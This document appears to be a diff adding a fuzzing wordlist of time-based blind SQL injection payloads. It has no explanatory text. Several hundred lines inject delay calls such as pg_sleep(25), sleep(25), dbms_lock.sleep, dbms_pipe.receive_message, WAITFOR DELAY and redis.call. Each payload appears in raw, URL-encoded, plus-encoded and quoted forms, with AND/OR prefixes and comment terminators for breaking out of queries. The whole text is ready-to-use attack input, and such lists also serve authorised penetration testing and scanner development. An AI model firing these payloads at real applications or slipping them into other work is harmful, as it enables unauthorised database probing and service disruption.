+%27%20pg_sleep%2825%29%20--%20-
+%27+pg_sleep%2825%29+--+-
+"' pg_sleep(25) -- -"
+'+pg_sleep(25)+-- -
+%27%2Bpg_sleep%2825%29%2B--%20-
+"'+pg_sleep(25)+-- -"
+ OR'+pg_sleep(25)+-- -
+%20OR%27%2Bpg_sleep%2825%29%2B--%20-
+" OR'+pg_sleep(25)+-- -"
+ AND'+pg_sleep(25)+-- -
+%20AND%27%2Bpg_sleep%2825%29%2B--%20-
+" AND'+pg_sleep(25)+-- -"
+ AND'AND pg_sleep(25) -- -
+%20AND%27AND%20pg_sleep%2825%29%20--%20-
++AND%27AND+pg_sleep%2825%29+--+-
+" AND'AND pg_sleep(25) -- -"
+ OR'OR pg_sleep(25) -- -
+%20OR%27OR%20pg_sleep%2825%29%20--%20-
++OR%27OR+pg_sleep%2825%29+--+-
+" OR'OR pg_sleep(25) -- -"
+' AND pg_sleep(25)+-- -
+%27%20AND%20pg_sleep%2825%29%2B--%20-
+"' AND pg_sleep(25)+-- -"
+' OR pg_sleep(25)+-- -
+%27%20AND%20pg_sleep%2825%29%2B--%20-
+"' OR pg_sleep(25)+-- -"
+' AND pg_sleep(25) -- -
+%27%20AND%20pg_sleep%2825%29%20--%20-
+"' AND pg_sleep(25) -- -"
+' OR pg_sleep(25) -- -
+%27%20OR%20pg_sleep%2825%29%20--%20-
+"' OR pg_sleep(25) -- -"
+' dbms_pipe.receive_message(('a'),25) -- -
+%27%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20--%20-
+%27+dbms_pipe.receive_message%28%28%27a%27%29%2C25%29+--+-
+"' dbms_pipe.receive_message(('a'),25) -- -"
+'+dbms_pipe.receive_message(('a'),25)+-- -
+%27%2Bdbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B--%20-
+"'+dbms_pipe.receive_message(('a'),25)+-- -"
+ OR'+dbms_pipe.receive_message(('a'),25)+-- -
+%20OR%27%2Bdbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B--%20-
+" OR'+dbms_pipe.receive_message(('a'),25)+-- -"
+ AND'+dbms_pipe.receive_message(('a'),25)+-- -
+%20AND%27%2Bdbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B--%20-
+" AND'+dbms_pipe.receive_message(('a'),25)+-- -"
+ AND'AND dbms_pipe.receive_message(('a'),25) -- -
+%20AND%27AND%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20--%20-
++AND%27AND+dbms_pipe.receive_message%28%28%27a%27%29%2C25%29+--+-
+" AND'AND dbms_pipe.receive_message(('a'),25) -- -"
+ OR'OR dbms_pipe.receive_message(('a'),25) -- -
+%20OR%27OR%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20--%20-
++OR%27OR+dbms_pipe.receive_message%28%28%27a%27%29%2C25%29+--+-
+" OR'OR dbms_pipe.receive_message(('a'),25) -- -"
+' AND dbms_pipe.receive_message(('a'),25)+-- -
+%27%20AND%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B--%20-
+"' AND dbms_pipe.receive_message(('a'),25)+-- -"
+' OR dbms_pipe.receive_message(('a'),25)+-- -
+%27%20AND%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B--%20-
+"' OR dbms_pipe.receive_message(('a'),25)+-- -"
+' AND dbms_pipe.receive_message(('a'),25) -- -
+%27%20AND%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20--%20-
+"' AND dbms_pipe.receive_message(('a'),25) -- -"
+' OR dbms_pipe.receive_message(('a'),25) -- -
+%27%20OR%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20--%20-
+"' OR dbms_pipe.receive_message(('a'),25) -- -"
+' sleep(25) -- -
+%27%20sleep%2825%29%20--%20-
+%27+sleep%2825%29+--+-
+"' sleep(25) -- -"
+'+sleep(25)+-- -
+%27%2Bsleep%2825%29%2B--%20-
+"'+sleep(25)+-- -"
+ OR'+sleep(25)+-- -
+%20OR%27%2Bsleep%2825%29%2B--%20-
+" OR'+sleep(25)+-- -"
+ AND'+sleep(25)+-- -
+%20AND%27%2Bsleep%2825%29%2B--%20-
+" AND'+sleep(25)+-- -"
+ AND'AND sleep(25) -- -
+%20AND%27AND%20sleep%2825%29%20--%20-
++AND%27AND+sleep%2825%29+--+-
+" AND'AND sleep(25) -- -"
+ OR'OR sleep(25) -- -
+%20OR%27OR%20sleep%2825%29%20--%20-
++OR%27OR+sleep%2825%29+--+-
+" OR'OR sleep(25) -- -"
+' AND sleep(25)+-- -
+%27%20AND%20sleep%2825%29%2B--%20-
+"' AND sleep(25)+-- -"
+' OR sleep(25)+-- -
+%27%20AND%20sleep%2825%29%2B--%20-
+"' OR sleep(25)+-- -"
+' AND sleep(25) -- -
+%27%20AND%20sleep%2825%29%20--%20-
+"' AND sleep(25) -- -"
+' OR sleep(25) -- -
+%27%20OR%20sleep%2825%29%20--%20-
+"' OR sleep(25) -- -"
+' dbms_lock.sleep(25) -- -
+%27%20dbms_lock.sleep%2825%29%20--%20-
+%27+dbms_lock.sleep%2825%29+--+-
+"' dbms_lock.sleep(25) -- -"
+'+dbms_lock.sleep(25)+-- -
+%27%2Bdbms_lock.sleep%2825%29%2B--%20-
+"'+dbms_lock.sleep(25)+-- -"
+ OR'+dbms_lock.sleep(25)+-- -
+%20OR%27%2Bdbms_lock.sleep%2825%29%2B--%20-
+" OR'+dbms_lock.sleep(25)+-- -"
+ AND'+dbms_lock.sleep(25)+-- -
+%20AND%27%2Bdbms_lock.sleep%2825%29%2B--%20-
+" AND'+dbms_lock.sleep(25)+-- -"
+ AND'AND dbms_lock.sleep(25) -- -
+%20AND%27AND%20dbms_lock.sleep%2825%29%20--%20-
++AND%27AND+dbms_lock.sleep%2825%29+--+-
+" AND'AND dbms_lock.sleep(25) -- -"
+ OR'OR dbms_lock.sleep(25) -- -
+%20OR%27OR%20dbms_lock.sleep%2825%29%20--%20-
++OR%27OR+dbms_lock.sleep%2825%29+--+-
+" OR'OR dbms_lock.sleep(25) -- -"
+' AND dbms_lock.sleep(25)+-- -
+%27%20AND%20dbms_lock.sleep%2825%29%2B--%20-
+"' AND dbms_lock.sleep(25)+-- -"
+' OR dbms_lock.sleep(25)+-- -
+%27%20AND%20dbms_lock.sleep%2825%29%2B--%20-
+"' OR dbms_lock.sleep(25)+-- -"
+' AND dbms_lock.sleep(25) -- -
+%27%20AND%20dbms_lock.sleep%2825%29%20--%20-
+"' AND dbms_lock.sleep(25) -- -"
+' OR dbms_lock.sleep(25) -- -
+%27%20OR%20dbms_lock.sleep%2825%29%20--%20-
+"' OR dbms_lock.sleep(25) -- -"
+' redis.call("TIME")[25] -- -
+%27%20redis.call%28%22TIME%22%29%5B25%5D%20--%20-
+%27+redis.call%28%22TIME%22%29%5B25%5D+--+-
+'\' redis.call("TIME")[25] -- -'
+'+redis.call("TIME")[25]+-- -
+%27%2Bredis.call%28%22TIME%22%29%5B25%5D%2B--%20-
+'\'+redis.call("TIME")[25]+-- -'
+ OR'+redis.call("TIME")[25]+-- -
+%20OR%27%2Bredis.call%28%22TIME%22%29%5B25%5D%2B--%20-
+' OR\'+redis.call("TIME")[25]+-- -'
+ AND'+redis.call("TIME")[25]+-- -
+%20AND%27%2Bredis.call%28%22TIME%22%29%5B25%5D%2B--%20-
+' AND\'+redis.call("TIME")[25]+-- -'
+ AND'AND redis.call("TIME")[25] -- -
+%20AND%27AND%20redis.call%28%22TIME%22%29%5B25%5D%20--%20-
++AND%27AND+redis.call%28%22TIME%22%29%5B25%5D+--+-
+' AND\'AND redis.call("TIME")[25] -- -'
+ OR'OR redis.call("TIME")[25] -- -
+%20OR%27OR%20redis.call%28%22TIME%22%29%5B25%5D%20--%20-
++OR%27OR+redis.call%28%22TIME%22%29%5B25%5D+--+-
+' OR\'OR redis.call("TIME")[25] -- -'
+' AND redis.call("TIME")[25]+-- -
+%27%20AND%20redis.call%28%22TIME%22%29%5B25%5D%2B--%20-
+'\' AND redis.call("TIME")[25]+-- -'
+' OR redis.call("TIME")[25]+-- -
+%27%20AND%20redis.call%28%22TIME%22%29%5B25%5D%2B--%20-
+'\' OR redis.call("TIME")[25]+-- -'
+' AND redis.call("TIME")[25] -- -
+%27%20AND%20redis.call%28%22TIME%22%29%5B25%5D%20--%20-
+'\' AND redis.call("TIME")[25] -- -'
+' OR redis.call("TIME")[25] -- -
+%27%20OR%20redis.call%28%22TIME%22%29%5B25%5D%20--%20-
+'\' OR redis.call("TIME")[25] -- -'
+' WAITFOR DELAY '00:00:25' -- -
+%27%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20--%20-
+%27+WAITFOR+DELAY+%2700%3A00%3A25%27+--+-
+"' WAITFOR DELAY '00:00:25' -- -"
+'+WAITFOR DELAY '00:00:25'+-- -
+%27%2BWAITFOR%20DELAY%20%2700%3A00%3A25%27%2B--%20-
+"'+WAITFOR DELAY '00:00:25'+-- -"
+ OR'+WAITFOR DELAY '00:00:25'+-- -
+%20OR%27%2BWAITFOR%20DELAY%20%2700%3A00%3A25%27%2B--%20-
+" OR'+WAITFOR DELAY '00:00:25'+-- -"
+ AND'+WAITFOR DELAY '00:00:25'+-- -
+%20AND%27%2BWAITFOR%20DELAY%20%2700%3A00%3A25%27%2B--%20-
+" AND'+WAITFOR DELAY '00:00:25'+-- -"
+ AND'AND WAITFOR DELAY '00:00:25' -- -
+%20AND%27AND%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20--%20-
++AND%27AND+WAITFOR+DELAY+%2700%3A00%3A25%27+--+-
+" AND'AND WAITFOR DELAY '00:00:25' -- -"
+ OR'OR WAITFOR DELAY '00:00:25' -- -
+%20OR%27OR%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20--%20-
++OR%27OR+WAITFOR+DELAY+%2700%3A00%3A25%27+--+-
+" OR'OR WAITFOR DELAY '00:00:25' -- -"
+' AND WAITFOR DELAY '00:00:25'+-- -
+%27%20AND%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%2B--%20-
+"' AND WAITFOR DELAY '00:00:25'+-- -"
+' OR WAITFOR DELAY '00:00:25'+-- -
+%27%20AND%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%2B--%20-
+"' OR WAITFOR DELAY '00:00:25'+-- -"
+' AND WAITFOR DELAY '00:00:25' -- -
+%27%20AND%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20--%20-
+"' AND WAITFOR DELAY '00:00:25' -- -"
+' OR WAITFOR DELAY '00:00:25' -- -
+%27%20OR%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20--%20-
+"' OR WAITFOR DELAY '00:00:25' -- -"
++ pg_sleep(25) --
+%2B%20pg_sleep%2825%29%20--
+%2B+pg_sleep%2825%29+--
+'+ pg_sleep(25) --'
+++pg_sleep(25)+--
+%2B%2Bpg_sleep%2825%29%2B--
+'++pg_sleep(25)+--'
+ OR++pg_sleep(25)+--
+%20OR%2B%2Bpg_sleep%2825%29%2B--
+' OR++pg_sleep(25)+--'
+ AND++pg_sleep(25)+--
+%20AND%2B%2Bpg_sleep%2825%29%2B--
+' AND++pg_sleep(25)+--'
+ AND+AND pg_sleep(25) --
+%20AND%2BAND%20pg_sleep%2825%29%20--
++AND%2BAND+pg_sleep%2825%29+--
+' AND+AND pg_sleep(25) --'
+ OR+OR pg_sleep(25) --
+%20OR%2BOR%20pg_sleep%2825%29%20--
++OR%2BOR+pg_sleep%2825%29+--
+' OR+OR pg_sleep(25) --'
++ AND pg_sleep(25)+--
+%2B%20AND%20pg_sleep%2825%29%2B--
+'+ AND pg_sleep(25)+--'
++ OR pg_sleep(25)+--
+%2B%20AND%20pg_sleep%2825%29%2B--
+'+ OR pg_sleep(25)+--'
++ AND pg_sleep(25) --
+%2B%20AND%20pg_sleep%2825%29%20--
+'+ AND pg_sleep(25) --'
++ OR pg_sleep(25) --
+%2B%20OR%20pg_sleep%2825%29%20--
+'+ OR pg_sleep(25) --'
++ dbms_pipe.receive_message(('a'),25) --
+%2B%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20--
+%2B+dbms_pipe.receive_message%28%28%27a%27%29%2C25%29+--
+"+ dbms_pipe.receive_message(('a'),25) --"
+++dbms_pipe.receive_message(('a'),25)+--
+%2B%2Bdbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B--
+"++dbms_pipe.receive_message(('a'),25)+--"
+ OR++dbms_pipe.receive_message(('a'),25)+--
+%20OR%2B%2Bdbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B--
+" OR++dbms_pipe.receive_message(('a'),25)+--"
+ AND++dbms_pipe.receive_message(('a'),25)+--
+%20AND%2B%2Bdbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B--
+" AND++dbms_pipe.receive_message(('a'),25)+--"
+ AND+AND dbms_pipe.receive_message(('a'),25) --
+%20AND%2BAND%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20--
++AND%2BAND+dbms_pipe.receive_message%28%28%27a%27%29%2C25%29+--
+" AND+AND dbms_pipe.receive_message(('a'),25) --"
+ OR+OR dbms_pipe.receive_message(('a'),25) --
+%20OR%2BOR%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20--
++OR%2BOR+dbms_pipe.receive_message%28%28%27a%27%29%2C25%29+--
+" OR+OR dbms_pipe.receive_message(('a'),25) --"
++ AND dbms_pipe.receive_message(('a'),25)+--
+%2B%20AND%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B--
+"+ AND dbms_pipe.receive_message(('a'),25)+--"
++ OR dbms_pipe.receive_message(('a'),25)+--
+%2B%20AND%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B--
+"+ OR dbms_pipe.receive_message(('a'),25)+--"
++ AND dbms_pipe.receive_message(('a'),25) --
+%2B%20AND%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20--
+"+ AND dbms_pipe.receive_message(('a'),25) --"
++ OR dbms_pipe.receive_message(('a'),25) --
+%2B%20OR%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20--
+"+ OR dbms_pipe.receive_message(('a'),25) --"
++ sleep(25) --
+%2B%20sleep%2825%29%20--
+%2B+sleep%2825%29+--
+'+ sleep(25) --'
+++sleep(25)+--
+%2B%2Bsleep%2825%29%2B--
+'++sleep(25)+--'
+ OR++sleep(25)+--
+%20OR%2B%2Bsleep%2825%29%2B--
+' OR++sleep(25)+--'
+ AND++sleep(25)+--
+%20AND%2B%2Bsleep%2825%29%2B--
+' AND++sleep(25)+--'
+ AND+AND sleep(25) --
+%20AND%2BAND%20sleep%2825%29%20--
++AND%2BAND+sleep%2825%29+--
+' AND+AND sleep(25) --'
+ OR+OR sleep(25) --
+%20OR%2BOR%20sleep%2825%29%20--
++OR%2BOR+sleep%2825%29+--
+' OR+OR sleep(25) --'
++ AND sleep(25)+--
+%2B%20AND%20sleep%2825%29%2B--
+'+ AND sleep(25)+--'
++ OR sleep(25)+--
+%2B%20AND%20sleep%2825%29%2B--
+'+ OR sleep(25)+--'
++ AND sleep(25) --
+%2B%20AND%20sleep%2825%29%20--
+'+ AND sleep(25) --'
++ OR sleep(25) --
+%2B%20OR%20sleep%2825%29%20--
+'+ OR sleep(25) --'
++ dbms_lock.sleep(25) --
+%2B%20dbms_lock.sleep%2825%29%20--
+%2B+dbms_lock.sleep%2825%29+--
+'+ dbms_lock.sleep(25) --'
+++dbms_lock.sleep(25)+--
+%2B%2Bdbms_lock.sleep%2825%29%2B--
+'++dbms_lock.sleep(25)+--'
+ OR++dbms_lock.sleep(25)+--
+%20OR%2B%2Bdbms_lock.sleep%2825%29%2B--
+' OR++dbms_lock.sleep(25)+--'
+ AND++dbms_lock.sleep(25)+--
+%20AND%2B%2Bdbms_lock.sleep%2825%29%2B--
+' AND++dbms_lock.sleep(25)+--'
+ AND+AND dbms_lock.sleep(25) --
+%20AND%2BAND%20dbms_lock.sleep%2825%29%20--
++AND%2BAND+dbms_lock.sleep%2825%29+--
+' AND+AND dbms_lock.sleep(25) --'
+ OR+OR dbms_lock.sleep(25) --
+%20OR%2BOR%20dbms_lock.sleep%2825%29%20--
++OR%2BOR+dbms_lock.sleep%2825%29+--
+' OR+OR dbms_lock.sleep(25) --'
++ AND dbms_lock.sleep(25)+--
+%2B%20AND%20dbms_lock.sleep%2825%29%2B--
+'+ AND dbms_lock.sleep(25)+--'
++ OR dbms_lock.sleep(25)+--
+%2B%20AND%20dbms_lock.sleep%2825%29%2B--
+'+ OR dbms_lock.sleep(25)+--'
++ AND dbms_lock.sleep(25) --
+%2B%20AND%20dbms_lock.sleep%2825%29%20--
+'+ AND dbms_lock.sleep(25) --'
++ OR dbms_lock.sleep(25) --
+%2B%20OR%20dbms_lock.sleep%2825%29%20--
+'+ OR dbms_lock.sleep(25) --'
++ redis.call("TIME")[25] --
+%2B%20redis.call%28%22TIME%22%29%5B25%5D%20--
+%2B+redis.call%28%22TIME%22%29%5B25%5D+--
+'+ redis.call("TIME")[25] --'
+++redis.call("TIME")[25]+--
+%2B%2Bredis.call%28%22TIME%22%29%5B25%5D%2B--
+'++redis.call("TIME")[25]+--'
+ OR++redis.call("TIME")[25]+--
+%20OR%2B%2Bredis.call%28%22TIME%22%29%5B25%5D%2B--
+' OR++redis.call("TIME")[25]+--'
+ AND++redis.call("TIME")[25]+--
+%20AND%2B%2Bredis.call%28%22TIME%22%29%5B25%5D%2B--
+' AND++redis.call("TIME")[25]+--'
+ AND+AND redis.call("TIME")[25] --
+%20AND%2BAND%20redis.call%28%22TIME%22%29%5B25%5D%20--
++AND%2BAND+redis.call%28%22TIME%22%29%5B25%5D+--
+' AND+AND redis.call("TIME")[25] --'
+ OR+OR redis.call("TIME")[25] --
+%20OR%2BOR%20redis.call%28%22TIME%22%29%5B25%5D%20--
++OR%2BOR+redis.call%28%22TIME%22%29%5B25%5D+--
+' OR+OR redis.call("TIME")[25] --'
++ AND redis.call("TIME")[25]+--
+%2B%20AND%20redis.call%28%22TIME%22%29%5B25%5D%2B--
+'+ AND redis.call("TIME")[25]+--'
++ OR redis.call("TIME")[25]+--
+%2B%20AND%20redis.call%28%22TIME%22%29%5B25%5D%2B--
+'+ OR redis.call("TIME")[25]+--'
++ AND redis.call("TIME")[25] --
+%2B%20AND%20redis.call%28%22TIME%22%29%5B25%5D%20--
+'+ AND redis.call("TIME")[25] --'
++ OR redis.call("TIME")[25] --
+%2B%20OR%20redis.call%28%22TIME%22%29%5B25%5D%20--
+'+ OR redis.call("TIME")[25] --'
++ WAITFOR DELAY '00:00:25' --
+%2B%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20--
+%2B+WAITFOR+DELAY+%2700%3A00%3A25%27+--
+"+ WAITFOR DELAY '00:00:25' --"
+++WAITFOR DELAY '00:00:25'+--
+%2B%2BWAITFOR%20DELAY%20%2700%3A00%3A25%27%2B--
+"++WAITFOR DELAY '00:00:25'+--"
+ OR++WAITFOR DELAY '00:00:25'+--
+%20OR%2B%2BWAITFOR%20DELAY%20%2700%3A00%3A25%27%2B--
+" OR++WAITFOR DELAY '00:00:25'+--"
+ AND++WAITFOR DELAY '00:00:25'+--
+%20AND%2B%2BWAITFOR%20DELAY%20%2700%3A00%3A25%27%2B--
+" AND++WAITFOR DELAY '00:00:25'+--"
+ AND+AND WAITFOR DELAY '00:00:25' --
+%20AND%2BAND%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20--
++AND%2BAND+WAITFOR+DELAY+%2700%3A00%3A25%27+--
+" AND+AND WAITFOR DELAY '00:00:25' --"
+ OR+OR WAITFOR DELAY '00:00:25' --
+%20OR%2BOR%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20--
++OR%2BOR+WAITFOR+DELAY+%2700%3A00%3A25%27+--
+" OR+OR WAITFOR DELAY '00:00:25' --"
++ AND WAITFOR DELAY '00:00:25'+--
+%2B%20AND%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%2B--
+"+ AND WAITFOR DELAY '00:00:25'+--"
++ OR WAITFOR DELAY '00:00:25'+--
+%2B%20AND%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%2B--
+"+ OR WAITFOR DELAY '00:00:25'+--"
++ AND WAITFOR DELAY '00:00:25' --
+%2B%20AND%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20--
+"+ AND WAITFOR DELAY '00:00:25' --"
++ OR WAITFOR DELAY '00:00:25' --
+%2B%20OR%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20--
+"+ OR WAITFOR DELAY '00:00:25' --"
++ pg_sleep(25) --+-
+%2B%20pg_sleep%2825%29%20--%2B-
+%2B+pg_sleep%2825%29+--%2B-
+'+ pg_sleep(25) --+-'
+++pg_sleep(25)+--+-
+%2B%2Bpg_sleep%2825%29%2B--%2B-
+'++pg_sleep(25)+--+-'
+ OR++pg_sleep(25)+--+-
+%20OR%2B%2Bpg_sleep%2825%29%2B--%2B-
+' OR++pg_sleep(25)+--+-'
+ AND++pg_sleep(25)+--+-
+%20AND%2B%2Bpg_sleep%2825%29%2B--%2B-
+' AND++pg_sleep(25)+--+-'
+ AND+AND pg_sleep(25) --+-
+%20AND%2BAND%20pg_sleep%2825%29%20--%2B-
++AND%2BAND+pg_sleep%2825%29+--%2B-
+' AND+AND pg_sleep(25) --+-'
+ OR+OR pg_sleep(25) --+-
+%20OR%2BOR%20pg_sleep%2825%29%20--%2B-
++OR%2BOR+pg_sleep%2825%29+--%2B-
+' OR+OR pg_sleep(25) --+-'
++ AND pg_sleep(25)+--+-
+%2B%20AND%20pg_sleep%2825%29%2B--%2B-
+'+ AND pg_sleep(25)+--+-'
++ OR pg_sleep(25)+--+-
+%2B%20AND%20pg_sleep%2825%29%2B--%2B-
+'+ OR pg_sleep(25)+--+-'
++ AND pg_sleep(25) --+-
+%2B%20AND%20pg_sleep%2825%29%20--%2B-
+'+ AND pg_sleep(25) --+-'
++ OR pg_sleep(25) --+-
+%2B%20OR%20pg_sleep%2825%29%20--%2B-
+'+ OR pg_sleep(25) --+-'
++ dbms_pipe.receive_message(('a'),25) --+-
+%2B%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20--%2B-
+%2B+dbms_pipe.receive_message%28%28%27a%27%29%2C25%29+--%2B-
+"+ dbms_pipe.receive_message(('a'),25) --+-"
+++dbms_pipe.receive_message(('a'),25)+--+-
+%2B%2Bdbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B--%2B-
+"++dbms_pipe.receive_message(('a'),25)+--+-"
+ OR++dbms_pipe.receive_message(('a'),25)+--+-
+%20OR%2B%2Bdbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B--%2B-
+" OR++dbms_pipe.receive_message(('a'),25)+--+-"
+ AND++dbms_pipe.receive_message(('a'),25)+--+-
+%20AND%2B%2Bdbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B--%2B-
+" AND++dbms_pipe.receive_message(('a'),25)+--+-"
+ AND+AND dbms_pipe.receive_message(('a'),25) --+-
+%20AND%2BAND%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20--%2B-
++AND%2BAND+dbms_pipe.receive_message%28%28%27a%27%29%2C25%29+--%2B-
+" AND+AND dbms_pipe.receive_message(('a'),25) --+-"
+ OR+OR dbms_pipe.receive_message(('a'),25) --+-
+%20OR%2BOR%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20--%2B-
++OR%2BOR+dbms_pipe.receive_message%28%28%27a%27%29%2C25%29+--%2B-
+" OR+OR dbms_pipe.receive_message(('a'),25) --+-"
++ AND dbms_pipe.receive_message(('a'),25)+--+-
+%2B%20AND%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B--%2B-
+"+ AND dbms_pipe.receive_message(('a'),25)+--+-"
++ OR dbms_pipe.receive_message(('a'),25)+--+-
+%2B%20AND%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B--%2B-
+"+ OR dbms_pipe.receive_message(('a'),25)+--+-"
++ AND dbms_pipe.receive_message(('a'),25) --+-
+%2B%20AND%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20--%2B-
+"+ AND dbms_pipe.receive_message(('a'),25) --+-"
++ OR dbms_pipe.receive_message(('a'),25) --+-
+%2B%20OR%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20--%2B-
+"+ OR dbms_pipe.receive_message(('a'),25) --+-"
++ sleep(25) --+-
+%2B%20sleep%2825%29%20--%2B-
+%2B+sleep%2825%29+--%2B-
+'+ sleep(25) --+-'
+++sleep(25)+--+-
+%2B%2Bsleep%2825%29%2B--%2B-
+'++sleep(25)+--+-'
+ OR++sleep(25)+--+-
+%20OR%2B%2Bsleep%2825%29%2B--%2B-
+' OR++sleep(25)+--+-'
+ AND++sleep(25)+--+-
+%20AND%2B%2Bsleep%2825%29%2B--%2B-
+' AND++sleep(25)+--+-'
+ AND+AND sleep(25) --+-
+%20AND%2BAND%20sleep%2825%29%20--%2B-
++AND%2BAND+sleep%2825%29+--%2B-
+' AND+AND sleep(25) --+-'
+ OR+OR sleep(25) --+-
+%20OR%2BOR%20sleep%2825%29%20--%2B-
++OR%2BOR+sleep%2825%29+--%2B-
+' OR+OR sleep(25) --+-'
++ AND sleep(25)+--+-
+%2B%20AND%20sleep%2825%29%2B--%2B-
+'+ AND sleep(25)+--+-'
++ OR sleep(25)+--+-
+%2B%20AND%20sleep%2825%29%2B--%2B-
+'+ OR sleep(25)+--+-'
++ AND sleep(25) --+-
+%2B%20AND%20sleep%2825%29%20--%2B-
+'+ AND sleep(25) --+-'
++ OR sleep(25) --+-
+%2B%20OR%20sleep%2825%29%20--%2B-
+'+ OR sleep(25) --+-'
++ dbms_lock.sleep(25) --+-
+%2B%20dbms_lock.sleep%2825%29%20--%2B-
+%2B+dbms_lock.sleep%2825%29+--%2B-
+'+ dbms_lock.sleep(25) --+-'
+++dbms_lock.sleep(25)+--+-
+%2B%2Bdbms_lock.sleep%2825%29%2B--%2B-
+'++dbms_lock.sleep(25)+--+-'
+ OR++dbms_lock.sleep(25)+--+-
+%20OR%2B%2Bdbms_lock.sleep%2825%29%2B--%2B-
+' OR++dbms_lock.sleep(25)+--+-'
+ AND++dbms_lock.sleep(25)+--+-
+%20AND%2B%2Bdbms_lock.sleep%2825%29%2B--%2B-
+' AND++dbms_lock.sleep(25)+--+-'
+ AND+AND dbms_lock.sleep(25) --+-
+%20AND%2BAND%20dbms_lock.sleep%2825%29%20--%2B-
++AND%2BAND+dbms_lock.sleep%2825%29+--%2B-
+' AND+AND dbms_lock.sleep(25) --+-'
+ OR+OR dbms_lock.sleep(25) --+-
+%20OR%2BOR%20dbms_lock.sleep%2825%29%20--%2B-
++OR%2BOR+dbms_lock.sleep%2825%29+--%2B-
+' OR+OR dbms_lock.sleep(25) --+-'
++ AND dbms_lock.sleep(25)+--+-
+%2B%20AND%20dbms_lock.sleep%2825%29%2B--%2B-
+'+ AND dbms_lock.sleep(25)+--+-'
++ OR dbms_lock.sleep(25)+--+-
+%2B%20AND%20dbms_lock.sleep%2825%29%2B--%2B-
+'+ OR dbms_lock.sleep(25)+--+-'
++ AND dbms_lock.sleep(25) --+-
+%2B%20AND%20dbms_lock.sleep%2825%29%20--%2B-
+'+ AND dbms_lock.sleep(25) --+-'
++ OR dbms_lock.sleep(25) --+-
+%2B%20OR%20dbms_lock.sleep%2825%29%20--%2B-
+'+ OR dbms_lock.sleep(25) --+-'
++ redis.call("TIME")[25] --+-
+%2B%20redis.call%28%22TIME%22%29%5B25%5D%20--%2B-
+%2B+redis.call%28%22TIME%22%29%5B25%5D+--%2B-
+'+ redis.call("TIME")[25] --+-'
+++redis.call("TIME")[25]+--+-
+%2B%2Bredis.call%28%22TIME%22%29%5B25%5D%2B--%2B-
+'++redis.call("TIME")[25]+--+-'
+ OR++redis.call("TIME")[25]+--+-
+%20OR%2B%2Bredis.call%28%22TIME%22%29%5B25%5D%2B--%2B-
+' OR++redis.call("TIME")[25]+--+-'
+ AND++redis.call("TIME")[25]+--+-
+%20AND%2B%2Bredis.call%28%22TIME%22%29%5B25%5D%2B--%2B-
+' AND++redis.call("TIME")[25]+--+-'
+ AND+AND redis.call("TIME")[25] --+-
+%20AND%2BAND%20redis.call%28%22TIME%22%29%5B25%5D%20--%2B-
++AND%2BAND+redis.call%28%22TIME%22%29%5B25%5D+--%2B-
+' AND+AND redis.call("TIME")[25] --+-'
+ OR+OR redis.call("TIME")[25] --+-
+%20OR%2BOR%20redis.call%28%22TIME%22%29%5B25%5D%20--%2B-
++OR%2BOR+redis.call%28%22TIME%22%29%5B25%5D+--%2B-
+' OR+OR redis.call("TIME")[25] --+-'
++ AND redis.call("TIME")[25]+--+-
+%2B%20AND%20redis.call%28%22TIME%22%29%5B25%5D%2B--%2B-
+'+ AND redis.call("TIME")[25]+--+-'
++ OR redis.call("TIME")[25]+--+-
+%2B%20AND%20redis.call%28%22TIME%22%29%5B25%5D%2B--%2B-
+'+ OR redis.call("TIME")[25]+--+-'
++ AND redis.call("TIME")[25] --+-
+%2B%20AND%20redis.call%28%22TIME%22%29%5B25%5D%20--%2B-
+'+ AND redis.call("TIME")[25] --+-'
++ OR redis.call("TIME")[25] --+-
+%2B%20OR%20redis.call%28%22TIME%22%29%5B25%5D%20--%2B-
+'+ OR redis.call("TIME")[25] --+-'
++ WAITFOR DELAY '00:00:25' --+-
+%2B%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20--%2B-
+%2B+WAITFOR+DELAY+%2700%3A00%3A25%27+--%2B-
+"+ WAITFOR DELAY '00:00:25' --+-"
+++WAITFOR DELAY '00:00:25'+--+-
+%2B%2BWAITFOR%20DELAY%20%2700%3A00%3A25%27%2B--%2B-
